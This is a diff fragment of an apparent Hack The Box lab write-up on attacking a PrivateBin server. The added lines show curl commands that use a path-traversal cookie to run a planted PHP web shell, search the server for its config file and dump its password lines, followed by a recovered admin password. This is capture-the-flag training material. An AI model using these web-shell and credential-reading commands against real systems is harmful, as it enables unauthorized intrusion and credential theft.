@@ -170,8 +170,31 @@ enumerate group operator, write a php shell inside /privatebin-data/data/bd/b5/ 
   `-G --data-urlencode "cmd=id"`
 `uid=65534(nobody) gid=82(www-data) groups=82(www-data)`
 
+```
+┌──(kali㉿kali)-[~/htb-academy]
+└─$ curl -k https://bin.kobold.htb/ \
+  -b "template=../data/bd/b5/shell" \
+  -G --data-urlencode "cmd= find / -name conf.php"
+/srv/cfg/conf.php
+                                                                                                                                                                                                                                    
+┌──(kali㉿kali)-[~/htb-academy]
+└─$ curl -k https://bin.kobold.htb/ \
+  -b "template=../data/bd/b5/shell" \
+  -G --data-urlencode "cmd= cat /srv/cfg/conf.php | grep password"
+; enable or disable the password feature, defaults to true
+password = true
+; enable or disable the password feature, defaults to true
+password = true
+                                                                                                                                                                                                                                    
+┌──(kali㉿kali)-[~/htb-academy]
+└─$ curl -k https://bin.kobold.htb/ \
+  -b "template=../data/bd/b5/shell" \
+  -G --data-urlencode "cmd=cat /srv/cfg/conf.php"
+```
 
-
+```
+pwd = "ComplexP@sswordAdmin1928"
+```
 ---
 ## Foothold
 
